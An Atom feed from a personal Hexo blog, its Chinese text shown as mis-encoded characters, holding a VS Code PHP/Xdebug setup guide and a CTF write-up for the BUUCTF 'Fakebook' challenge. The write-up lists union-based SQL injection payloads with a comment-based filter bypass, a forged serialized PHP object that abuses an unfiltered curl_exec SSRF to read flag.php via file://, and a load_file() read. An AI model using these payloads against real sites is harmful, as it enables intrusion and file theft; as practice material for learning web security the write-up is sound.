<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>huhu</title>
  
  <subtitle>myhã®åšå®¢</subtitle>
  <link href="https://huhu-myh.github.io/atom.xml" rel="self"/>
  
  <link href="https://huhu-myh.github.io/"/>
  <updated>2022-02-15T05:34:34.675Z</updated>
  <id>https://huhu-myh.github.io/</id>
  
  <author>
    <name>huhu</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>Vscodeé…ç½®PHPå¼€å‘ç¯å¢ƒ</title>
    <link href="https://huhu-myh.github.io/posts/myh10019.html"/>
    <id>https://huhu-myh.github.io/posts/myh10019.html</id>
    <published>2022-02-15T02:53:02.000Z</published>
    <updated>2022-02-15T05:34:34.675Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="Vscodeé…ç½®PHP"><a href="#Vscodeé…ç½®PHP" class="headerlink" title="Vscodeé…ç½®PHP"></a>Vscodeé…ç½®PHP</h2><h3 id="1-æœ¬åœ°æ­å»ºApache-PHP-Mysql"><a href="#1-æœ¬åœ°æ­å»ºApache-PHP-Mysql" class="headerlink" title="1.æœ¬åœ°æ­å»ºApache+PHP+Mysql"></a>1.æœ¬åœ°æ­å»ºApache+PHP+Mysql</h3><p>é¦–å…ˆæœ¬åœ°æ­å»ºäº†Apache+PHP+Mysqlï¼Œç½‘ä¸Šæœ‰å¾ˆå¤šæ•™ç¨‹ï¼Œå…·ä½“æˆ‘æ‰¾åˆ°äº†ä¸¤ç¯‡æ¯”è¾ƒå¥½çš„ï¼š</p><p><a href="https://blog.csdn.net/m0_46708757/article/details/108653384?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164489677816780366553184%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164489677816780366553184&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-108653384.pc_search_insert_es_download&amp;utm_term=+%E6%9C%80%E6%96%B0%EF%BC%81%EF%BC%81%EF%BC%81Windows10+Apache+php+mysql%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+PHP%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA&amp;spm=1018.2226.3001.4187"> æœ€æ–°ï¼ï¼ï¼Windows10 Apache+php+mysqlç¯å¢ƒæ­å»º PHPç¯å¢ƒæ­å»º</a></p><p><a href="https://blog.csdn.net/u014095878/article/details/107042936?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522164489684116781685340868%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fall.%2522%257D&amp;request_id=164489684116781685340868&amp;biz_id=0&amp;utm_medium=distribute.pc_search_result.none-task-blog-2~all~first_rank_ecpm_v1~rank_v31_ecpm-1-107042936.pc_search_insert_es_download&amp;utm_term=windows%E4%B8%8B%E6%90%AD%E5%BB%BAapache+php+mysql+vscode%E7%8E%AF%E5%A2%83%E6%9C%80%E8%AF%A6%E7%BB%86%E6%95%99%E7%A8%8B&amp;spm=1018.2226.3001.4187">windowsä¸‹æ­å»ºapache+php+mysql+vscodeç¯å¢ƒæœ€è¯¦ç»†æ•™ç¨‹</a></p><h3 id="2-Vscodeé…ç½®"><a href="#2-Vscodeé…ç½®" class="headerlink" title="2.Vscodeé…ç½®"></a>2.Vscodeé…ç½®</h3><p>ç½‘ä¸Šä¹Ÿæœ‰å¾ˆå¤šè¿™ä¸ªæ•™ç¨‹ä½†æ˜¯éƒ½å·®æœ€åè¿™ä¹ˆä¸€ç‚¹è§£é‡Šå’Œè¯´æ˜ï¼ŒåŸºæœ¬çš„é…ç½®æ•™ç¨‹ï¼š</p><p><a href="https://zhuanlan.zhihu.com/p/359984466">https://zhuanlan.zhihu.com/p/359984466</a></p><p>ç„¶åä¸‹é¢ä»‹ç»ä¸€äº›æ”¹å˜ï¼Œä¸Šé¢æ•™ç¨‹éƒ½æ˜¯è¾ƒè€çš„ï¼Œæ–°ç‰ˆæœ¬çš„é…ç½®éœ€è¦æ”¹åŠ¨ä¸€äº›æ–¹é¢ï¼š</p><h4 id="2-1-Xdebugçš„é…ç½®"><a href="#2-1-Xdebugçš„é…ç½®" class="headerlink" title="2.1 Xdebugçš„é…ç½®"></a>2.1 Xdebugçš„é…ç½®</h4><p>ä¸Šé¢æ•™ç¨‹é‡Œä¹Ÿæåˆ°äº†ï¼Œå¾ˆå¤šéƒ½æ²¡è¯´ã€‚ç›®å‰çš„å·²ç»æ˜¯ç‰ˆæœ¬3äº†ï¼Œæ‰€ä»¥é…ç½®æœ‰å¦‚ä¸‹æ”¹å˜ï¼š</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334229.png" style="zoom:150%;"><pre class="line-numbers language-none"><code class="language-none">[xdebug];xdebug3æ‰©å±•zend_extension = "E:\php\env\php-8.0.3\ext\php_xdebug-3.0.3-8.0-vs16-x86_64.dll";æ”¹ä¸ºè‡ªå·±çš„è·¯å¾„;xdebug3ä¸xdebug2é…ç½®ä¸åŒï¼Œé…ç½®å‚è€ƒhttps://xdebug.org/docs/step_debug#start_with_request;è®¾ç½®debugæ¨¡å¼xdebug.mode=debug;æ¿€æ´»debugxdebug.start_with_request=yes;å…è®¸ä¸åŒæœºå™¨è®¿é—®;xdebug.discover_client_host = false ;è¿œç¨‹ä¸»æœº é»˜è®¤localhost;xdebug.client_host=localhost#è¿œç¨‹ç«¯å£xdebug.client_port = 9000<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="2-2æ’ä»¶PHP-Debugçš„é…ç½®"><a href="#2-2æ’ä»¶PHP-Debugçš„é…ç½®" class="headerlink" title="2.2æ’ä»¶PHP Debugçš„é…ç½®"></a>2.2æ’ä»¶PHP Debugçš„é…ç½®</h4><p>ä¸‹è½½æ’ä»¶åæ€»æ˜¯è¿è¡Œä¸äº†ï¼ŒæŠ¥é”™å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">PHP executable not found. Install PHP and add it to your PATH or set the php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>è¿™æ˜¯å› ä¸ºç‰ˆæœ¬å‡çº§åï¼Œç›¸å…³é…ç½®æ”¹å˜äº†ï¼Œä¹‹å‰åœ¨setting.jsonä¸­é…ç½®phpè§£é‡Šè·¯å¾„å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">"php.validate.executablePath": "E:/php/env/php-8.0.3/php.exe","php.executablePath": "E:/php/env/php-8.0.3/php.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>ä½†æ˜¯å½“å‰æ’ä»¶éœ€è¦æ”¹å˜ä¸ºå¦‚ä¸‹ï¼Œè¿™ä¸ªæ˜¯æ ½äº†å¥½é•¿æ—¶é—´çš„å‘ï¼Œç½‘ä¸Šä¹Ÿæ²¡æœ‰ç›¸å…³çº æ­£ï¼š</p><pre class="line-numbers language-none"><code class="language-none">"php.debug.executablePath": "D:\\httpd\\PHP\\php.exe","php.validate.executablePath": "D:\\httpd\\PHP\\php.exe"<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="2-3launch-jsoné…ç½®"><a href="#2-3launch-jsoné…ç½®" class="headerlink" title="2.3launch.jsoné…ç½®"></a>2.3launch.jsoné…ç½®</h4><p>ç‚¹å‡»åˆ›å»ºlaunch.jsonä¼šè‡ªåŠ¨ç”Ÿæˆç›¸å…³çš„é…ç½®ï¼Œä½†æ˜¯å…¶ä¸­çš„Xdebugç«¯å£å·å¯èƒ½æ˜¯9003ï¼Œè®°å¾—æ”¹ä¸ºä¸Šé¢Xdebugçš„è¿œç¨‹ç«¯å£å·ã€‚</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334231.png"></p><h3 id="3-å¦‚ä½•è°ƒè¯•"><a href="#3-å¦‚ä½•è°ƒè¯•" class="headerlink" title="3 å¦‚ä½•è°ƒè¯•"></a>3 å¦‚ä½•è°ƒè¯•</h3><p>åœ¨Vscodeä¸­è°ƒè¯•æœ‰ä¸¤ç§æ–¹å¼ï¼Œä¸€ä¸ªå°±æ˜¯åœ¨ç¼–è¾‘å™¨ä¸­è°ƒè¯•ï¼Œè¿˜æœ‰ä¸€ç§å°±æ˜¯è¿œç¨‹è°ƒè¯•ã€‚</p><h4 id="3-1-Launch-currently-open-script"><a href="#3-1-Launch-currently-open-script" class="headerlink" title="3.1 Launch currently open script"></a>3.1 Launch currently open script</h4><p>å°±æ˜¯è°ƒè¯•ç›®å‰æ‰“å¼€çš„è„šæœ¬æ–‡ä»¶ï¼Œå¦‚å›¾ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334233.png"></p><p>è¿™æ ·å°±å¯ä»¥ä¸€æ­¥ä¸€æ­¥è°ƒè¯•äº†ã€‚ä¸‹é¢æœ‰å¯¹åº”çš„è°ƒè¯•æ§åˆ¶å°æ˜¾ç¤ºå¯¹åº”çš„è¾“å‡ºã€‚</p><h4 id="3-2-Listen-for-Xdebug"><a href="#3-2-Listen-for-Xdebug" class="headerlink" title="3.2 Listen for Xdebug"></a>3.2 Listen for Xdebug</h4><p>å°±æ˜¯é€šè¿‡ç›‘å¬ç«¯å£ä½¿ç”¨Xdebugè°ƒè¯•ã€‚è¿™é‡Œæœ‰å…³Xdebugçš„åŸç†å’Œç›¸å…³è¯´æ˜å¦‚ä¸‹ï¼š</p><p><a href="https://segmentfault.com/a/1190000011332021">https://segmentfault.com/a/1190000011332021</a></p><p><a href="https://blog.csdn.net/qq_43615820/article/details/106409289">https://blog.csdn.net/qq_43615820/article/details/106409289</a></p><p>ä»ä¸Šé¢ä»‹ç»å¯ä»¥çŸ¥é“æˆ‘ä»¬è®¾ç½®çš„9000ç«¯å£åªæ˜¯ç¼–è¾‘å™¨Vscodeå’Œæµè§ˆå™¨çš„ä¸€ä¸ª<font color="red" size="3">é€šä¿¡ç«¯å£</font>ï¼Œå¹¶ä¸æ˜¯æˆ‘ä»¬è¦è®¿é—®çš„å¦‚ï¼šlocalhost:9000/test.phpã€‚</p><p>æ‰€ä»¥æˆ‘ä»¬è¦è¿›è¡Œè°ƒè¯•è®¿é—®çš„é¡µé¢è¿˜æ˜¯æœåŠ¡å™¨åœ°å€å¦‚ï¼šlocalhost/test.php(é»˜è®¤80ç«¯å£ï¼Œæ ¹æ®è‡ªå·±é…ç½®çš„ç«¯å£è¿›è¡Œä¿®æ”¹)ã€‚</p><h4 id="3-2-1-æ‰“å¼€-Listen-for-Xdebug"><a href="#3-2-1-æ‰“å¼€-Listen-for-Xdebug" class="headerlink" title="3.2.1 æ‰“å¼€ Listen for Xdebug"></a>3.2.1 æ‰“å¼€ Listen for Xdebug</h4><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334234.png"></p><p>æ­¤æ—¶å¯ä»¥å‘ç°è¿˜æ²¡æœ‰è¿›å…¥åˆ°è°ƒè¯•çŠ¶æ€ï¼Œå¤„äºç›‘å¬ç«¯å£ä¸­ã€‚</p><h4 id="3-2-2-è®¿é—®é¡µé¢"><a href="#3-2-2-è®¿é—®é¡µé¢" class="headerlink" title="3.2.2 è®¿é—®é¡µé¢"></a>3.2.2 è®¿é—®é¡µé¢</h4><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334235.png"></p><p>å¯ä»¥çœ‹åˆ°å¹¶æ²¡æœ‰è¿›å…¥åˆ°è¿™ä¸ªé¡µé¢ä¸­å»ï¼Œè¿™é‡Œå¯èƒ½ä¼šä½¿å°ç™½ç–‘æƒ‘ï¼Œéš¾é“é…ç½®é”™äº†ï¼Ÿ</p><p>å¹¶ä¸æ˜¯ï¼Œè¿™æ—¶å€™å·²ç»å¼€å§‹è°ƒè¯•äº†ï¼Œä½†ä¼šVscodeé¡µé¢å¯ä»¥çœ‹åˆ°å¯ä»¥è°ƒè¯•äº†ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334236.png"></p><p>è°ƒè¯•åˆ°å“ªä¸€æ­¥ç»“æŸï¼Œæµè§ˆå™¨å°±ä¼šå‘ˆç°åˆ°å“ªä¸€æ­¥ï¼ä¸è¿‡å†æ¬¡åˆ·æ–°å°±æ˜¯åŸæ¥å†…å®¹äº†ã€‚</p><h3 id="æ€»ç»“"><a href="#æ€»ç»“" class="headerlink" title="æ€»ç»“"></a>æ€»ç»“</h3><p>æ€»çš„æ¥è¯´é…ç½®äº†ä¸€å¤©å§ï¼Œæ¥æ¥å›å›æŸ¥ç›¸å…³æ•™ç¨‹å’ŒæŠ¥é”™ä¿¡æ¯ï¼Œæœ€åè¿˜æ˜¯å®˜æ–¹æ–‡æ¡£å¥½ç”¨ï¼Œç‰¹åˆ«æ˜¯æ‰§è¡Œè·¯å¾„é‚£é‡Œï¼Œæ¯•ç«Ÿæ’ä»¶ç‰ˆæœ¬ä¼šå‡ï¼Œç›¸å…³é…ç½®éš¾å…ä¼šæœ‰å˜åŒ–ï¼Œæ‰€ä»¥æ•™ç¨‹æœ€å¥½è·Ÿç€å®˜æ–¹æ–‡æ¡£æ¥ã€‚</p><hr><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/yunwei/202202151334237.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="è¿ç»´" scheme="https://huhu-myh.github.io/categories/%E8%BF%90%E7%BB%B4/"/>
    
    
    <category term="PHP" scheme="https://huhu-myh.github.io/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title>buuctfç»ƒä¹ ï¼š31-40</title>
    <link href="https://huhu-myh.github.io/posts/myh10018.html"/>
    <id>https://huhu-myh.github.io/posts/myh10018.html</id>
    <published>2022-02-13T01:02:03.000Z</published>
    <updated>2022-02-14T03:17:36.798Z</updated>
    
    <content type="html"><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><h2 id="31-ç½‘é¼æ¯-2018-Fakebook"><a href="#31-ç½‘é¼æ¯-2018-Fakebook" class="headerlink" title="31.[ç½‘é¼æ¯ 2018]Fakebook"></a>31.[ç½‘é¼æ¯ 2018]Fakebook</h2><p>è¿™ä¸ªé¢˜è€ƒå¯Ÿçš„è¿˜æ˜¯æ¯”è¾ƒå¥½çš„ï¼Œç»†ç»†ç ”ç©¶ä¸€ä¸‹ã€‚è€ƒå¯Ÿçš„ä¸»è¦æ˜¯SQLæ³¨å…¥ï¼ŒSSRFè¯»å–æ–‡ä»¶ï¼Œunion selectçŸ¥è¯†ç‚¹ã€‚</p><p>é¦–å…ˆéšä¾¿æ³¨å†Œä¸ªè´¦å·ï¼Œè¿™ä¸ªåšå®¢å¿…é¡»æ˜¯åœ°å€ï¼Œå¥½åƒæœ‰ä¸ª<code>.</code>å°±è¡Œã€‚ç„¶åå°±ç™»é™†è¿›å»äº†ã€‚è¿™æ˜¯å¯ä»¥çœ‹åˆ°ç”¨æˆ·åæ˜¯å¯ä»¥ç‚¹çš„ï¼Œçœ¼è¦å¥½ä½¿ğŸ˜‰ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040181.png"></p><p>ç‚¹è¿›å»è¿›å…¥åˆ°view.phpå°±æ˜¯è‡ªå·±çš„ä¿¡æ¯ç•Œé¢ï¼Œä½†æ˜¯å‘ç°åé¢æœ‰ä¸ªå‚æ•°ï¼Œé‚£å°±è¯•è¯•æ³¨å…¥ï¼Œ<code>1'</code>å‡ºç°æŠ¥é”™å°±å­˜åœ¨SQLæ³¨å…¥ï¼Œç›´æ¥ç»™å‡ºç›¸å…³payload:</p><pre class="line-numbers language-none"><code class="language-none">2 order by 4 #2 union select 1,2,3,4# â€”â€”è¢«è¿‡æ»¤äº†ä¸œè¥¿æ˜¾ç¤º :no back~_~2 union/**/select 1,2,3,4 # æ˜¾ç¤ºç¬¬äºŒä½2 union/**/select 1,database(),3,4 #  fakebook2 union/**/select 1,table_name,3,4 from information_schema.tables where table_schema='fakebook' #  â€”â€”usersè®°ä½è¯­æ³•ï¼šfromæ˜¯åœ¨å­—æ®µçš„åé¢ï¼ï¼ï¼2 union/**/select 1,group_concat(column_name),3,4 from information_schema.columns where table_schema='fakebook' and table_name='users' #  â€”â€”è¿”å›no,username,passwd,dataï¼Œå°±æ˜¯è‡ªå·±æ³¨å†Œçš„ä¿¡æ¯2 union/**/select 1,data,3,4 from users #     ï¼šO:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:5:"1.com";} è‡ªå·±ä¿¡æ¯çš„åºåˆ—åŒ–å†…å®¹<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ³¨å…¥åˆ°è¿™é‡Œå¹¶æ²¡æœ‰ä»€ä¹ˆflagï¼Œåªæœ‰è‡ªå·±çš„ä¿¡æ¯ï¼Œä½†æ˜¯è¿™ä¸ªdataæ˜¯æœ‰ç”¨çš„ã€‚å†ä»é¡µé¢è¿”å›çš„å†…å®¹æ‰¾ä¿¡æ¯ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040183.png"></p><p>å‘ç°å­˜åœ¨<code>unserialize()</code>å‡½æ•°ä»¥åŠ<code>getBlogContent()</code>å‡½æ•°ï¼Œå¤§è‡´å°±å¯ä»¥çŒœåˆ°ä¼šæœ‰ä¸€ä¸ªç±»<code>UserInfo</code>ï¼ŒæŠŠç”¨æˆ·ä¿¡æ¯å­˜å‚¨ä¸ºä¸€ä¸ªå¯¹è±¡ï¼Œç„¶åå†è¿›è¡Œåºåˆ—åŒ–å­˜å‚¨åˆ°dataå­—æ®µé‡Œã€‚ç„¶åè¯»å–blogå†…å®¹ä¹‹å‰ä¼šå…ˆè¿›è¡Œååºåˆ—åŒ–ï¼Œç„¶åè°ƒç”¨å¯¹è±¡çš„<code>getBlogContent()</code>å‡½æ•°ã€‚è¿™é‡Œå°±å¯ä»¥çŒœæµ‹ï¼Œå¦‚æœæˆ‘ä»¬è¦è¯»å–flagï¼Œå¯èƒ½è¯•è¯•åˆ©ç”¨è¿™ä¸ªè¯»å–å‡½æ•°ï¼Œå¦‚æœå­˜åœ¨SSRFçš„è¯ã€‚</p><p>è¿™é‡Œå…¶å®å°±å¯ä»¥çŒœæµ‹å­˜åœ¨flag.phpï¼Œç„¶æ ¹æ®ä¸Šé¢çš„è·¯å¾„ï¼Œæ„é€ å¦‚ä¸‹è¯•ä¸€è¯•ï¼š</p><pre class="line-numbers language-none"><code class="language-none">O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>é‚£ä¹ˆpayloadå°±å¦‚ä¸‹ï¼š</p><pre class="line-numbers language-none"><code class="language-none">2 union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}' #<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥çœ‹æºç ç¡®å®å¾—åˆ°äº†flagï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040184.png"></p><p>å…¶å®è¿™é‡Œå­˜åœ¨è¿æ°”ï¼Œå› ä¸ºä¸ç¡®å®šflagåœ¨å“ªä»¥åŠæ˜¯å¦å­˜åœ¨SSRFæ¼æ´ã€‚è¿™æ—¶å¯ä»¥è¯•è¯•diresearchæ‰«æä¸‹ç›®å½•ï¼Œä¼šå‘ç°robots.txtå’Œflag.phpï¼Œè¯´æ˜å°±åœ¨è¿™ä¸ªç›®å½•ã€‚åŒæ—¶æ‰“å¼€robot.txtå‘ç°äº†ç±»çš„æºç ï¼š</p><pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span><span class="token keyword">class</span> <span class="token class-name">UserInfo</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$age</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token double-quoted-string string">""</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token variable">$name</span><span class="token punctuation">,</span> <span class="token variable">$age</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">name</span> <span class="token operator">=</span> <span class="token variable">$name</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">age</span> <span class="token operator">=</span> <span class="token punctuation">(</span>int<span class="token punctuation">)</span><span class="token variable">$age</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">blog</span> <span class="token operator">=</span> <span class="token variable">$blog</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">function</span> <span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$output</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token variable">$httpCode</span> <span class="token operator">=</span> <span class="token function">curl_getinfo</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLINFO_HTTP_CODE</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$httpCode</span> <span class="token operator">==</span> <span class="token number">404</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>            <span class="token keyword">return</span> <span class="token number">404</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token variable">$output</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> getBlogContents <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token keyword">return</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token function">get</span><span class="token punctuation">(</span><span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> isValidBlog <span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$blog</span> <span class="token operator">=</span> <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">&gt;</span><span class="token property">blog</span><span class="token punctuation">;</span>        <span class="token keyword">return</span> <span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token double-quoted-string string">"/^(((http(s?))\:\/\/)?)([0-9a-zA-Z\-]+\.)+[a-zA-Z]{2,6}(\:[0-9]+)?(\/\S*)?$/i"</span><span class="token punctuation">,</span> <span class="token variable">$blog</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥å‘ç°<code>curl_exec()</code>å¯¼è‡´ssrfæ¼æ´ï¼Œæ²¡æœ‰è¿›è¡Œä»»ä½•è¿‡æ»¤ã€‚åŒæ—¶ä¹Ÿå‘ç°äº†ç±»çš„æ„é€ ã€‚ç„¶åpayloadæ˜¯ä¸€æ ·çš„ã€‚</p><p>å…¶å®åœ¨ä½¿ç”¨ï¼š</p><pre class="line-numbers language-mysql" data-language="mysql"><code class="language-mysql">union/**/select 1,2,3,'O:8:"UserInfo":3:{s:4:"name";s:1:"1";s:3:"age";i:1;s:4:"blog";s:29:"file:///var/www/html/flag.php";}'<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>ä½¿ç”¨äº†mysqlçš„union selectç‰¹æ€§ï¼Œå‰é¢çš„æ–‡ç« è®²è¿‡ï¼Œåœ¨æ•°æ®ä¸å­˜åœ¨æ—¶ï¼Œä¼šå¢åŠ è™šæ‹Ÿæ•°æ®ï¼š</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040185.png"></p><p>è¿™æ ·æˆ‘ä»¬æ‰å¯ä»¥æŸ¥è¯¢æˆ‘ä»¬æ„é€ çš„ï¼Œå¦åˆ™æ•°æ®åº“é‡Œæ²¡æœ‰é‚£ä¸ªdataï¼ŒæŸ¥ä¹ŸæŸ¥ä¸åˆ°çš„ã€‚</p><p>æœ€åçœ‹äº†åˆ«çš„å¸ˆå‚…çš„wpï¼Œå‘ç°å¦ä¸€ç§ç®€å•çš„æ–¹æ³•ï¼š</p><pre class="line-numbers language-none"><code class="language-none">2 union/**/select 1,user(),3,4 #  root@localhost<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>æŸ¥è¯¢æ•°æ®åº“å½“å‰ç”¨æˆ·çš„èº«ä»½ï¼Œå‘ç°æ˜¯rootï¼Œç„¶åå°±å¯ä»¥ä½¿ç”¨<code>load_file('/var/www/html/flag.php')</code>å‡½æ•°ç›´æ¥è¯»å–æ–‡ä»¶æ•°æ®äº†ï¼ğŸ¤©</p><p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131040186.png"></p><h2 id="32-GXYCTF2019-BabyUpload"><a href="#32-GXYCTF2019-BabyUpload" class="headerlink" title="32.[GXYCTF2019]BabyUpload"></a>32.[GXYCTF2019]BabyUpload</h2><p>è¿™ä¸ªé¢˜é‡å¤äº†å“ˆï¼Œå’Œä¹‹å‰çš„26é¢˜ <a href="https://huhu-myh.github.io/posts/myh10012.html#toc-heading-6">[MRCTF2020]ä½ ä¼ ä½ ğŸå‘¢</a> æ˜¯ä¸€æ ·çš„æ€è·¯ï¼Œè§£é¢˜éƒ½ä¸€æ ·ï¼Œå°±ä¸å¤šè¯´å’§ã€‚</p><p>é¢˜ç›®æºç ï¼š<a href="https://github.com/imagin-sch/GXY_CTF/tree/master/Web/babyupload">https://github.com/imagin-sch/GXY_CTF/tree/master/Web/babyupload</a></p><hr><p>é¢˜ç›®é€æ¸åŠ éš¾ï¼Œä¸å†²ä¸è¡Œå’§ğŸ¤ª</p><img src="https://cdn.jsdelivr.net/gh/huhu-myh/image@master/buu4/202202131042058.jpg" style="zoom:150%;">]]></content>
    
    
      
      
    <summary type="html">&lt;link rel=&quot;stylesheet&quot; class=&quot;aplayer-secondary-style-marker&quot; href=&quot;\assets\css\APlayer.min.css&quot;&gt;&lt;script src=&quot;\assets\js\APlayer.min.js&quot; cla</summary>
      
    
    
    
    <category term="CTF" scheme="https://huhu-myh.github.io/categories/CTF/"/>
    
    
    <category term="buuç»ƒä¹ " scheme="https://huhu-myh.github.io/tags/buu%E7%BB%83%E4%B9%A0/"/>
    
  </entry>
  
  <entry>
    <title>Burp_suiteå®‰è£…ä½¿ç”¨</title>
    <link href="https://huhu-myh.github.io/posts/myh10017.html"/>
    <id>https://huhu-myh.github.io/posts/myh10017.html</id>
    <published>2022-02-12T11:16:08.000Z</published>
    <updated>2022-02-12T11:45:52.433Z</updated>
    
